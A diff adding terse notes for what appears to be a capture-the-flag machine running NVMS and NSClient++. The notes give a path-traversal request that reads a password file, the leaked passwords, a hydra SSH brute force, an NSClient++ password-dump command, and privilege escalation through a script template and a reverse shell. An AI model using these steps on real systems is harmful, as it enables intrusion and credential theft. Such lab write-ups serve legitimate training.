@@ -1,0 +1,69 @@
+OS:
+- Linux
+
+Open Ports:
+- PORT      STATE SERVICE
+- 21/tcp    open  ftp
+- 22/tcp    open  ssh
+- 80/tcp    open  http
+- 135/tcp   open  msrpc
+- 139/tcp   open  netbios-ssn
+- 445/tcp   open  microsoft-ds
+- 5040/tcp  open  unknown
+- 5666/tcp  open  nrpe
+- 6063/tcp  open  x11
+- 6699/tcp  open  napster
+- 7680/tcp  open  pando-pub
+- 8443/tcp  open  https-alt
+- 49664/tcp open  unknown
+- 49665/tcp open  unknown
+- 49666/tcp open  unknown
+- 49667/tcp open  unknown
+- 49668/tcp open  unknown
+- 49669/tcp open  unknown
+- 49670/tcp open  unknown
+
+- enumerating port 21, downloaded files from anonymous login
+- notes files from users
+- secret files in Sharepoint
+- password was placed on Nathan's desktop
+- enumerating web ports: 80, 8443
+- nvms service running on 80
+- LFI exploit
+- requesting: GET /../../../../../../../../../../../../Users/Nathan/Desktop/Passwords.txt HTTP/1.1
+- contents:
+1nsp3ctTh3Way2Mars!
+Th3r34r3To0M4nyTrait0r5!
+B3WithM30r4ga1n5tMe
+L1k3B1gBut7s@W0rk
+0nly7h3y0unGWi11F0l10w
+IfH3s4b0Utg0t0H1sH0me
+Gr4etN3w5w17hMySk1Pa5$
+
+- hydra to brute force ssh with passwords
+Nadine:L1k3B1gBut7s@W0rk
+
+- nsclient++ has a password show option from cmd: nscp web -- password --display
+- ran cmd. got credentials:
+password: ew2x6SsGTxjRwXOT
+
+- only able to log in from localhost
+- used SSH to get a reverse tunnel for 8443 portal
+- logged in with creds
+- created a new script template to execute file:
+C:/Temp/root.bat
+
+- nsclient priv esc exploit
+
+template details:
+Section: /settings/external scripts/yo
+Key: command
+Value: C:/Temp/shell.bat
+C:\\programdata\\shell.bat
+
+- had issues with getting a reverse shell on the box without antivirus dropping the connection
+- tried unicorn
+- tried msfvenom exe payload
+- nc 64 bit worked, was using 32 bit before
+- running query on nsclient to get priv escalation
+- got root shell
